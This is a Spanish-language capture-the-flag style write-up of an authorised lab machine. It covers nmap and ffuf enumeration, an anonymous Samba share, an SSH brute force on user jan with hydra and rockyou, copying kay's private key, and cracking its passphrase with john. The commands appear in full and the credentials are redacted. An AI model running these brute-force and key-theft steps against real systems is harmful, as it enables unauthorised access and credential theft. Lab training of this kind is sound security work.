# Basic Pentesting — Writeup

**Objetivo:** Máquina de laboratorio (IP: `$IP`) — Fecha: 2025-09-26
**Alcance:** Pruebas autorizadas sobre la máquina de laboratorio. No publicar credenciales ni claves privadas.

---

## TL;DR

Se identificaron servicios HTTP, SSH y Samba. Se encontró un share anónimo con `staff.txt` que sugiere el usuario `jan`. Se obtuvo acceso SSH a `jan` por fuerza bruta (wordlist `rockyou`), desde `jan` se recuperó la clave privada de `kay` y se crackeó su passphrase con `john`, permitiendo acceso final como `kay`.

---

## Entorno y herramientas

* Kali Linux (o similar)
* nmap 7.95
* ffuf
* smbclient
* hydra
* john / ssh2john
* Wordlists: `/usr/share/wordlists/rockyou.txt`, `directory-list-2.3-small.txt`

Evidencia completa y salidas largas se almacenan en la carpeta `evidence/` (archivos con credenciales o claves están **REDACTED** y no se suben públicamente).

---

## Enumeración (nmap)

**Comando**

```bash
nmap -sV --open $IP
```

**Comentario:** `-sV` detecta versiones de servicios. 

**Resumen**

* 22/tcp open  ssh (OpenSSH 8.2p1)
* 80/tcp open  http (Apache/2.4.41)
* 139/445/tcp open Samba (smbd)

(Salida completa: `evidence/nmap_$IP.txt`)

---

## 2) Enumeración de directorios web (ffuf)

**Comando**

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 300 -s -c
```

**Comentario:** `-t 300` define la cantidad de hilos; `-s` silencia headers extra; `-c` activa color en resultado.

**Resultado relevante**

* `/development`

(Detalle: `evidence/ffuf_$IP.txt`)

---

## 3) Samba — share anónimo

**Enumeración**

```bash
smbclient -L //$IP
```

**Resultado**

* Share accesible: `Anonymous (Disk)`

**Conexión y archivo**

```bash
smbclient //$IP/Anonymous
smb: \> ls
smb: \> get staff.txt
```

**staff.txt (extracto)**

> "PLEASE do not upload non-work-related items to this share... (This means you too, Jan!) — Kay"

**Comentario:** Indicio de usuario `jan`. Revisar si el share expone archivos sensibles o rutas del filesystem.

---

## Fuerza bruta SSH (usuario: jan)

**Comando**

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
```

**Comentario:** `-l` especifica login; `-P` wordlist; `-t 4` tareas paralelas. Usar siempre con autorización.

**Resultado (REDACTED en repo público)**

* Credenciales válidas obtenidas para `jan` (guardadas en `evidence/hydra_result.txt` con redacción).

---

## Acceso inicial y obtención de clave

**Operaciones realizadas**

```bash
ssh jan@$IP
# desde la sesión de jan:
scp jan@$IP:/home/kay/.ssh/id_rsa ./
```

**Comentario:** La clave privada `id_rsa` estaba accesible desde la cuenta `jan` — investigar permisos del fichero y si el share/sistema expuso la ruta. No se sube la clave al repo.

---

## Cracking de passphrase y acceso final

**Conversión y cracking**

```bash
ssh2john id_rsa > rsa_john.txt
john rsa_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado (REDACTED)**

* Passphrase crackeada (detalle almacenado en `evidence/john_result.txt`, con datos sensibles redacted).

**Uso**

```bash
ssh -i id_rsa kay@$IP
# introducir passphrase para la clave
cat pass.bak
```

(Contenido sensible de `pass.bak` redacted en repo.)

---

## Evidencia

* `evidence/nmap_result.txt`
* `evidence/ffuf_result.txt`
* `evidence/smbclient_list.txt`
* `evidence/smbclient_anonymous.txt`
* `evidence/staff.txt` (extracto)
* `evidence/hydra_result.txt` (redacted)
* `evidence/rsa_john.txt` (hash conversion)
* `evidence/john_result.txt` (redacted)


